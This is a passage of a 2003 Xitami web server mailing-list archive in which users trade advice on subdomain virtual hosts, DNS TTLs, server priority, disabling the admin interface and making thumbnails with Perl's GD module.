+10:36=20
+  PM<BR><B>To:</B> xitami@lists.xitami.org<BR><B>Subject:</B> Re: =
+[Xitami] Sub=20
+  domains<BR><BR></FONT></DIV>
+  <DIV>
+  <DIV><FONT face=3DArial size=3D2>Easiest way is to simply set up a new =
+host in=20
+  Admin.&nbsp; For example:</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; &gt;Virtual =
+Hosts</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; =
+&gt;New</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; Create virtual =
+host=20
+  profile:&nbsp; Anyname</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp;&nbsp;Enter DNS =
+host=20
+  name:&nbsp; sub.yourdomain.com</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; Web page root =
+directory:&nbsp;=20
+  c:\websites\sub</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial size=3D2>That's it.&nbsp; Don't select an IP =
+address, just=20
+  take the default of 'all addresses'.</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial size=3D2>You will need to have your DNS =
+provider create an=20
+  'A' record for the sub.domain.com and point it to your server's IP=20
+  address.&nbsp; If you do a DIG or NSLOOKUP, you would see this=20
+  entry:</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp;=20
+  sub.yourdomain.com.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
+86400&nbsp;&nbsp;&nbsp;=20
+  A&nbsp;&nbsp;&nbsp; 123.123.123.123</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial size=3D2>Or, if your registrar (such as =
+directNIC.com)=20
+  will do DNS for you and wildcard all subdomains (*.yourdomain.com), =
+then=20
+  nothing further is needed.&nbsp;&nbsp;&nbsp;</FONT></DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+  <DIV><FONT face=3DArial =
+size=3D2>=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D<BR>Day=20
+  Tooley<BR>Webfoot@EasyStreet.com</FONT></DIV>
+  <DIV>&nbsp;</DIV>
+  <DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV></DIV>
+  <BLOCKQUOTE dir=3Dltr=20
+  style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+    <DIV style=3D"FONT: 10pt arial">----- Original Message ----- </DIV>
+    <DIV=20
+    style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+    <A title=3Dron@miplanet.net href=3D"mailto:ron@miplanet.net">Ron =
+Ackerman</A>=20
+    </DIV>
+    <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+    href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+    <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Saturday, December 20, =
+2003 12:09=20
+    PM</DIV>
+    <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Sub =
+domains</DIV>
+    <DIV><BR></DIV>
+    <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff size=3D2>I=20
+    am able to do sub domains like <A=20
+    href=3D"http://www.mydomain.com/sub">www.mydomain.com/sub</A> or=20
+    sub.mydomain.com. Now of course the first one is just a directory =
+and=20
+    doesn't need it's own IP address. However with the second one I have =
+to set=20
+    up an IP address for it. Is there a way to set up sub.mydomain.com =
+without=20
+    it's own IP. </FONT></SPAN></DIV>
+    <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+    size=3D2></FONT></SPAN>&nbsp;</DIV>
+    <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+    =
+size=3D2>Ron</FONT></SPAN></DIV></BLOCKQUOTE></BLOCKQUOTE></BODY></HTML>
+
+------=_NextPart_000_0004_01C3C755.FCE0E2D0--
+
+
+From xitami@lists.xitami.org  Sun Dec 21 05:19:56 2003
+From: xitami@lists.xitami.org (Ron Ackerman)
+Date: Sun, 21 Dec 2003 00:19:56 -0500
+Subject: [Xitami] Server Priority
+In-Reply-To: <NFBBKNGGELNPLMHPBOCEEECPEAAA.ron@miplanet.net>
+Message-ID: <NFBBKNGGELNPLMHPBOCEOECPEAAA.ron@miplanet.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_000C_01C3C758.29B800C0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+[Alias]Just out of curiousity what does everyone have the Priority set to in
+defaults.cfg? (Windows machines)
+
+Ron
+
+------=_NextPart_000_000C_01C3C758.29B800C0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><SPAN class=3D214411705-21122003><FONT face=3DArial color=3D#0000ff =
+size=3D2>Just=20
+out of curiousity what does everyone have the Priority set to in =
+defaults.cfg?=20
+(Windows machines)</FONT></SPAN></DIV>
+<DIV><SPAN class=3D214411705-21122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D214411705-21122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2>Ron</FONT></SPAN></DIV></BODY></HTML>
+
+------=_NextPart_000_000C_01C3C758.29B800C0--
+
+
+From xitami@lists.xitami.org  Sun Dec 21 03:31:41 2003
+From: xitami@lists.xitami.org (Day Tooley)
+Date: Sat, 20 Dec 2003 19:31:41 -0800
+Subject: [Xitami] Sub domains
+References: <NFBBKNGGELNPLMHPBOCEOECGEAAA.ron@miplanet.net>
+Message-ID: <001501c3c772$f2e9beb0$e867a1d0@Tooley4600>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_01C3C72F.E4A78500
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+[Alias]Easiest way is to simply set up a new host in Admin.  For =
+example:
+    >Virtual Hosts
+    >New
+    Create virtual host profile:  Anyname
+    Enter DNS host name:  sub.yourdomain.com
+    Web page root directory:  c:\websites\sub
+
+That's it.  Don't select an IP address, just take the default of 'all =
+addresses'.
+
+You will need to have your DNS provider create an 'A' record for the =
+sub.domain.com and point it to your server's IP address.  If you do a =
+DIG or NSLOOKUP, you would see this entry:
+
+    sub.yourdomain.com.      86400    A    123.123.123.123
+
+Or, if your registrar (such as directNIC.com) will do DNS for you and =
+wildcard all subdomains (*.yourdomain.com), then nothing further is =
+needed.   =20
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Day Tooley
+Day@Webfooters.com
+
+
+  ----- Original Message -----=20
+  From: Ron Ackerman=20
+  To: xitami@lists.xitami.org=20
+  Sent: Saturday, December 20, 2003 12:09 PM
+  Subject: [Xitami] Sub domains
+
+
+  I am able to do sub domains like www.mydomain.com/sub or =
+sub.mydomain.com. Now of course the first one is just a directory and =
+doesn't need it's own IP address. However with the second one I have to =
+set up an IP address for it. Is there a way to set up sub.mydomain.com =
+without it's own IP.=20
+
+  Ron
+------=_NextPart_000_0012_01C3C72F.E4A78500
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><FONT face=3DArial size=3D2>Easiest way is to simply set up a new =
+host in=20
+Admin.&nbsp; For example:</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; &gt;Virtual =
+Hosts</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; &gt;New</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; Create virtual host=20
+profile:&nbsp; Anyname</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp;&nbsp;Enter DNS host =
+name:&nbsp;=20
+sub.yourdomain.com</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; Web page root =
+directory:&nbsp;=20
+c:\websites\sub</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>That's it.&nbsp; Don't select an IP =
+address, just=20
+take the default of 'all addresses'.</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>You will need to have your DNS provider =
+create an=20
+'A' record for the sub.domain.com and point it to your server's IP=20
+address.&nbsp; If you do a DIG or NSLOOKUP, you would see this=20
+entry:</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp;=20
+sub.yourdomain.com.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
+86400&nbsp;&nbsp;&nbsp;=20
+A&nbsp;&nbsp;&nbsp; 123.123.123.123</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>Or, if your registrar (such as =
+directNIC.com) will=20
+do DNS for you and wildcard all subdomains (*.yourdomain.com), then =
+nothing=20
+further is needed.&nbsp;&nbsp;&nbsp; </FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV>=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+<BR>Day Tooley<BR><A=20
+href=3D"mailto:Day@Webfooters.com">Day@Webfooters.com</A></DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<BLOCKQUOTE dir=3Dltr=20
+style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+  <DIV style=3D"FONT: 10pt arial">----- Original Message ----- </DIV>
+  <DIV=20
+  style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+  <A title=3Dron@miplanet.net href=3D"mailto:ron@miplanet.net">Ron =
+Ackerman</A>=20
+  </DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+  href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Saturday, December 20, =
+2003 12:09=20
+  PM</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Sub =
+domains</DIV>
+  <DIV><BR></DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff size=3D2>I am=20
+  able to do sub domains like <A=20
+  href=3D"http://www.mydomain.com/sub">www.mydomain.com/sub</A> or=20
+  sub.mydomain.com. Now of course the first one is just a directory and =
+doesn't=20
+  need it's own IP address. However with the second one I have to set up =
+an IP=20
+  address for it. Is there a way to set up sub.mydomain.com without it's =
+own IP.=20
+  </FONT></SPAN></DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2></FONT></SPAN>&nbsp;</DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2>Ron</FONT></SPAN></DIV></BLOCKQUOTE></BODY></HTML>
+
+------=_NextPart_000_0012_01C3C72F.E4A78500--
+
+
+From xitami@lists.xitami.org  Sun Dec 21 05:47:24 2003
+From: xitami@lists.xitami.org (Tom Baker)
+Date: Sun, 21 Dec 2003 00:47:24 -0500
+Subject: [Xitami] Server Priority
+References: <NFBBKNGGELNPLMHPBOCEOECPEAAA.ron@miplanet.net>
+Message-ID: <00d001c3c785$e89df670$0200a8c0@dsl.gtei.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_00CD_01C3C75B.FFC30C70
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+[Alias]From: Ron Ackerman=20
+  To: xitami@lists.xitami.org=20
+  Sent: Sunday, December 21, 2003 12:19 AM
+  Subject: [Xitami] Server Priority
+
+
+  Just out of curiousity what does everyone have the Priority set to in =
+defaults.cfg? (Windows machines)
+
+  Ron
+I've tried both normal and turbo, without seeing any difference.
+
+Tom
+------=_NextPart_000_00CD_01C3C75B.FFC30C70
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<BLOCKQUOTE dir=3Dltr=20
+style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+  <DIV=20
+  style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+  <A title=3Dron@miplanet.net href=3D"mailto:ron@miplanet.net">Ron =
+Ackerman</A>=20
+  </DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+  href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Sunday, December 21, 2003 =
+12:19=20
+  AM</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Server =
+Priority</DIV>
+  <DIV><BR></DIV>
+  <DIV><SPAN class=3D214411705-21122003><FONT face=3DArial =
+color=3D#0000ff size=3D2>Just=20
+  out of curiousity what does everyone have the Priority set to in =
+defaults.cfg?=20
+  (Windows machines)</FONT></SPAN></DIV>
+  <DIV><SPAN class=3D214411705-21122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2></FONT></SPAN>&nbsp;</DIV>
+  <DIV><SPAN class=3D214411705-21122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2>Ron</FONT></SPAN></DIV></BLOCKQUOTE>
+<DIV dir=3Dltr><SPAN class=3D214411705-21122003>I've tried both normal =
+and turbo,=20
+without seeing any difference.</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D214411705-21122003></SPAN>&nbsp;</DIV>
+<DIV dir=3Dltr><SPAN =
+class=3D214411705-21122003>Tom</SPAN></DIV></BODY></HTML>
+
+------=_NextPart_000_00CD_01C3C75B.FFC30C70--
+
+
+
+From xitami@lists.xitami.org  Sun Dec 21 07:33:39 2003
+From: xitami@lists.xitami.org (Marc Doigny)
+Date: Sun, 21 Dec 2003 08:33:39 +0100
+Subject: [Xitami] Server Priority
+In-Reply-To: <NFBBKNGGELNPLMHPBOCEOECPEAAA.ron@miplanet.net>
+References: <NFBBKNGGELNPLMHPBOCEEECPEAAA.ron@miplanet.net>
+Message-ID: <6.0.0.14.0.20031221083142.027923c0@mail.verfaillie.com>
+
+At 06:19 21/12/03, "Ron Ackerman" <ron@miplanet.net> wrote:
+>Just out of curiousity what does everyone have the Priority set to in 
+>defaults.cfg? (Windows machines)
+>
+>Ron
+
+Using high priority.
+This insures that the scripts that the server executes are running at a 
+priority "above average".
+There is a very small difference, but only noticeable when running 
+complicated executables.
+
+Marc
+
+
+
+From xitami@lists.xitami.org  Sun Dec 21 17:06:11 2003
+From: xitami@lists.xitami.org (Chestnut)
+Date: Sun, 21 Dec 2003 09:06:11 -0800
+Subject: [Xitami] Admin function.
+References: <3FE1F46E.6596.14211E3@localhost>
+Message-ID: <003201c3c7e4$bf9c7a80$d8c6ff40@2c01v01>
+
+looked at manual and it says 'To disable the WBA, remove the xiadmin entry
+form the [WSX] section in the xitami.cfg and default.cfg files.'
+hope this helps
+Patrick
+----- Original Message ----- 
+From: "WhiteShepherd" <fuzzydog@furtopia.org>
+To: <xitami@lists.xitami.org>
+Sent: Thursday, December 18, 2003 3:39 PM
+Subject: [Xitami] Admin function.
+
+
+> How do I get "rid" of the admin function?  None of my users can
+> use /admin directories in their web sites or it tries to bring up my
+> admin page.  Is there a way to configure this out?
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+
+From xitami@lists.xitami.org  Sun Dec 21 19:44:41 2003
+From: xitami@lists.xitami.org (WhiteShepherd)
+Date: Sun, 21 Dec 2003 14:44:41 -0500
+Subject: [Xitami] Admin function.
+In-Reply-To: <003201c3c7e4$bf9c7a80$d8c6ff40@2c01v01>
+Message-ID: <3FE5B1D9.23278.56352C0@localhost>
+
+Thanks!  That worked.  A lot of my users use PHP which often use 
+a /admin directory.  /admin is far to common a word to keep 
+reserved for the server only  Again thanks!
+  
+ Gene.
+
+On 21 Dec 2003 at 9:06, Chestnut wrote:
+
+> looked at manual and it says 'To disable the WBA, remove the xiadmin entry
+> form the [WSX] section in the xitami.cfg and default.cfg files.'
+> hope this helps
+> Patrick
+> ----- Original Message ----- 
+> From: "WhiteShepherd" <fuzzydog@furtopia.org>
+> To: <xitami@lists.xitami.org>
+> Sent: Thursday, December 18, 2003 3:39 PM
+> Subject: [Xitami] Admin function.
+> 
+> 
+> > How do I get "rid" of the admin function?  None of my users 
+can
+> > use /admin directories in their web sites or it tries to bring up 
+my
+> > admin page.  Is there a way to configure this out?
+> >
+> > --
+> > Xitami Users Mailing List -- For Xitami support
+> > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> >
+> 
+> 
+> 
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+
+From xitami@lists.xitami.org  Sun Dec 21 17:19:26 2003
+From: xitami@lists.xitami.org (Brian {Hamilton Kelly})
+Date: Sun, 21 Dec 2003 17:19:26 +0000 (GMT)
+Subject: [Xitami] Not Recognizing Domain Name: / Tom
+Message-ID: <54692@dsl.co.uk>
+
+In message <001501c3c77e$96dedae0$0200a8c0@dsl.gtei.net>
+   "Tom Baker" writes:
+
+> Remember, DNS records take a while to propage thru the internet. Expect
+> 24-96 hours on average before your update is seen by all servers.
+
+Such delays can be reduced by proper pre-planning of changes.  When
+changes to all or part of a domain are expected, change the TTL [Time To
+Live] of existing records to some short period (such as 900 seconds) at
+least a WEEK before making the change.  After this reduced period has
+propagated world-wide, other servers attempting to collect the
+information will know that it is more ephemeral, and will collect it
+more often and/or sooner.
+
+Then make the changes; wait 30 or so minutes for them to propagate and to
+check that everything is working as desired, and then put the TTL back to
+the usual 3--7 days.
+
+-- 
+Brian {Hamilton Kelly}                                          bhk@dsl.co.uk
+    "We can no longer stand apart from Europe if we would.  Yet we are
+    untrained to mix with our neighbours, or even talk to them".
+                                              George Macaulay Trevelyan, 1919
+
+From xitami@lists.xitami.org  Mon Dec 22 04:03:34 2003
+From: xitami@lists.xitami.org (Daniel Nowlin)
+Date: Sun, 21 Dec 2003 22:03:34 -0600
+Subject: [Xitami] DG perl module
+References: <54692@dsl.co.uk>
+Message-ID: <001901c3c840$91d71540$0301a8c0@danlap>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0016_01C3C80E.47089CF0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+Has anybody tried to install the perl module called GD?  If so how did =
+you get it installed.  I am running ActiveState perl version 5.8 and I =
+have tried the ppm but it does not install.
+------=_NextPart_000_0016_01C3C80E.47089CF0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><FONT face=3DArial size=3D2>Has anybody tried to install the perl =
+module called=20
+GD?&nbsp; If so how did you get it installed.&nbsp; I am running =
+ActiveState=20
+perl version 5.8 and I have tried the ppm but it does not=20
+install.</FONT></DIV></BODY></HTML>
+
+------=_NextPart_000_0016_01C3C80E.47089CF0--
+
+
+From xitami@lists.xitami.org  Tue Dec 23 00:06:07 2003
+From: xitami@lists.xitami.org (Ron Ackerman)
+Date: Mon, 22 Dec 2003 19:06:07 -0500
+Subject: [Xitami] Server Time
+In-Reply-To: <001901c3c840$91d71540$0301a8c0@danlap>
+Message-ID: <NFBBKNGGELNPLMHPBOCEIEFEEAAA.ron@miplanet.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0017_01C3C8BE.A760B460
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Server is located on the east coast, site owner is on the west coast. Is
+there a way to set the time differential for 1 site?
+
+Ron
+
+------=_NextPart_000_0017_01C3C8BE.A760B460
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><FONT face=3DArial size=3D2><SPAN class=3D879315923-22122003>Server =
+is located on=20
+the east coast, site owner is on the west coast. Is there a way to set =
+the time=20
+differential for 1 site?</SPAN></FONT></DIV>
+<DIV><FONT face=3DArial size=3D2><SPAN=20
+class=3D879315923-22122003></SPAN></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2><SPAN=20
+class=3D879315923-22122003>Ron</SPAN></FONT></DIV></BODY></HTML>
+
+------=_NextPart_000_0017_01C3C8BE.A760B460--
+
+
+From xitami@lists.xitami.org  Tue Dec 23 08:32:11 2003
+From: xitami@lists.xitami.org (Francis Turner)
+Date: Tue, 23 Dec 2003 09:32:11 +0100
+Subject: [Xitami] DG perl module
+In-Reply-To: <001901c3c840$91d71540$0301a8c0@danlap>
+References: <54692@dsl.co.uk> <001901c3c840$91d71540$0301a8c0@danlap>
+Message-ID: <3FE7FD8B.3030305@freesbee.fr>
+
+Daniel Nowlin wrote:
+
+>Has anybody tried to install the perl module called GD?  If so how did you get it installed.  I am running ActiveState perl version 5.8 and I have tried the ppm but it does not install.
+>  
+>
+Using Activestate perl 5.6.something I have had no problems at all with 
+installing GD and (getting it to run with Xitami)...  I'm pretty sure I 
+used the version 2 ppm rather than the ver 3 one that newer activestate 
+builds tend to make the default.
+
+Francis
+
+-- 
+Your theory of a donut-shaped universe is intriguing, Homer.
+I may have to steal it.        -- Prof S. Hawking on the "Simpsons"
+
+
+
+From xitami@lists.xitami.org  Tue Dec 23 16:04:12 2003
+From: xitami@lists.xitami.org (Daniel Nowlin)
+Date: Tue, 23 Dec 2003 10:04:12 -0600
+Subject: [Xitami] DG perl module
+References: <54692@dsl.co.uk> <001901c3c840$91d71540$0301a8c0@danlap> <3FE7FD8B.3030305@freesbee.fr>
+Message-ID: <007701c3c96e$68687e90$0301a8c0@danlap>
+
+thanks for the info.  I will try to do an un-install and use ppm2.
+----- Original Message ----- 
+From: "Francis Turner" <francis.turner@freesbee.fr>
+To: <xitami@lists.xitami.org>
+Sent: Tuesday, December 23, 2003 2:32 AM
+Subject: Re: [Xitami] DG perl module
+
+
+> Daniel Nowlin wrote:
+>
+> >Has anybody tried to install the perl module called GD?  If so how did
+you get it installed.  I am running ActiveState perl version 5.8 and I have
+tried the ppm but it does not install.
+> >
+> >
+> Using Activestate perl 5.6.something I have had no problems at all with
+> installing GD and (getting it to run with Xitami)...  I'm pretty sure I
+> used the version 2 ppm rather than the ver 3 one that newer activestate
+> builds tend to make the default.
+>
+> Francis
+>
+> -- 
+> Your theory of a donut-shaped universe is intriguing, Homer.
+> I may have to steal it.        -- Prof S. Hawking on the "Simpsons"
+>
+>
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+From xitami@lists.xitami.org  Tue Dec 23 16:21:11 2003
+From: xitami@lists.xitami.org (Daniel Nowlin)
+Date: Tue, 23 Dec 2003 10:21:11 -0600
+Subject: [Xitami] DG perl module
+References: <54692@dsl.co.uk> <001901c3c840$91d71540$0301a8c0@danlap> <3FE7FD8B.3030305@freesbee.fr> <007701c3c96e$68687e90$0301a8c0@danlap>
+Message-ID: <007c01c3c970$c7e3c8a0$0301a8c0@danlap>
+
+Well I uninstalled the GD package that I installed with ppm3 and installed
+GD with ppm2.  I get the same result.  The GD package fails at line 139.
+This is in the newfromjpeg subroutine on line 3.  This is the code that I am
+using to call GD:
+
+   $width = '96';
+  $pic_tmp = newFromJpeg GD::Image("$pic_file[$count]");
+  ($pic_imgW, $pic_imgH) = $pic_tmp->getBounds();
+  $ratio = ($pic_imgW / $width);
+  $height  = int($pic_imgH/$ratio);
+  $FinalImg = new GD::Image($width,$height);
+
+$FinalImg->copyResized($pic_tmp,0,0,0,0,$width,$height,$pic_imgW,$pic_imgH);
+
+  binmode STDOUT;
+
+  print "Content-type: image/jpeg; name=\"${file}_thumb\.jpg\"\n";
+  print "Content-Disposition: inline;
+filename=\"thumb_$pic_file[$count]\.jpg\"\n\n";
+  print $FinalImg->jpeg;
+
+What I am attempting is to have GD create a thumbnail image of a jpg
+picture.  Any ideas will be welcomed.
+Dan
+
+----- Original Message ----- 
+From: "Daniel Nowlin" <nowlind@missouri.edu>
+To: <xitami@lists.xitami.org>
+Sent: Tuesday, December 23, 2003 10:04 AM
+Subject: Re: [Xitami] DG perl module
+
+
+> thanks for the info.  I will try to do an un-install and use ppm2.
+> ----- Original Message ----- 
+> From: "Francis Turner" <francis.turner@freesbee.fr>
+> To: <xitami@lists.xitami.org>
+> Sent: Tuesday, December 23, 2003 2:32 AM
+> Subject: Re: [Xitami] DG perl module
+>
+>
+> > Daniel Nowlin wrote:
+> >
+> > >Has anybody tried to install the perl module called GD?  If so how did
+> you get it installed.  I am running ActiveState perl version 5.8 and I
+have
+> tried the ppm but it does not install.
+> > >
+> > >
+> > Using Activestate perl 5.6.something I have had no problems at all with
+> > installing GD and (getting it to run with Xitami)...  I'm pretty sure I
+> > used the version 2 ppm rather than the ver 3 one that newer activestate
+> > builds tend to make the default.
+> >
+> > Francis
+> >
+> > -- 
+> > Your theory of a donut-shaped universe is intriguing, Homer.
+> > I may have to steal it.        -- Prof S. Hawking on the "Simpsons"
+> >
+> >
+> >
+> > --
+> > Xitami Users Mailing List -- For Xitami support
+> > To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> >
+>
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+From xitami@lists.xitami.org  Tue Dec 23 17:43:34 2003
+From: xitami@lists.xitami.org (Francis Turner)
+Date: Tue, 23 Dec 2003 18:43:34 +0100
+Subject: [Xitami] DG perl module
+In-Reply-To: <007c01c3c970$c7e3c8a0$0301a8c0@danlap>
+References: <54692@dsl.co.uk> <001901c3c840$91d71540$0301a8c0@danlap> <3FE7FD8B.3030305@freesbee.fr> <007701c3c96e$68687e90$0301a8c0@danlap> <007c01c3c970$c7e3c8a0$0301a8c0@danlap>
+Message-ID: <3FE87EC6.8020909@freesbee.fr>
+
+Daniel Nowlin wrote:
+
+>What I am attempting is to have GD create a thumbnail image of a jpg
+>picture.  Any ideas will be welcomed.
+>Dan
+>  
+>
+You don't want to use GD then- IIRC Cg has a 256 colour palette so 
+photos get trashed. What I did in this case was use qx() to run 
+Irfanview (www.irfanview.com) on the relevant file. You use a line like
+
+$rc = qx(i_view32 \\$path\\$img /resample=(${percent}p,${percent}p) 
